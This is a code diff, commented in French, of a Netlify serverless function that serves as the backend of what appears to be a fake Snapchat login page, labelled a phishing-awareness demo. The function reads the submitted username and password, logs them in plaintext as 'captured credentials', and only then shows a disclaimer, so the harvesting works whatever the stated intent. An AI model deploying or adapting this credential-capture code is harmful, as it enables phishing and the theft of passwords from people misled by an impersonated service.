@@ -2,11 +2,9 @@ import json
 
 def handler(event, context):
     # Netlify envoie les données du formulaire dans event['body']
-    # Mais les données sont encodées en URL-encoded (application/x-www-form-urlencoded)
-    # On va les extraire manuellement
     body = event.get('body', '')
     
-    # Séparer les paires clé=valeur
+    # Extraire les données du formulaire (username=xxx&password=yyy)
     params = {}
     for pair in body.split('&'):
         if '=' in pair:
@@ -16,24 +14,23 @@ def handler(event, context):
     username = params.get('username', 'inconnu')
     password = params.get('password', 'inconnu')
     
-    # Afficher dans les logs Netlify (c'est là que vous verrez les identifiants !)
+    # ⭐ AFFICHAGE DANS LES LOGS NETLIFY (c'est ici que vous verrez les identifiants)
     print(f"🔴 IDENTIFIANTS CAPTURÉS : username={username}, password={password}")
     
-    # Renvoyer une réponse HTML pour que l'utilisateur voie le résultat
+    # Renvoyer une page HTML pour que l'utilisateur voie ses identifiants
     response_html = f"""
     <html>
         <body style="font-family: Arial; text-align: center; padding: 50px;">
             <h2>Login successful! (Démo pédagogique)</h2>
             <p>Identifiants reçus : <strong>{username}</strong> / <strong>{password}</strong></p>
-            <p style="color: red; font-size: 12px;">⚠️ Ceci est une démonstration de sensibilisation à la sécurité.</p>
+            <p style="color: red; font-size: 14px;">⚠️ Ceci est une démonstration pour apprendre à repérer les sites de phishing.</p>
+            <p style="font-size: 12px; color: gray;">Regardez l'URL dans la barre d'adresse : ce n'est PAS snapchat.com !</p>
         </body>
     </html>
     """
     
     return {
         'statusCode': 200,
-        'headers': {
-            'Content-Type': 'text/html',
-        },
+        'headers': {'Content-Type': 'text/html'},
         'body': response_html
     }
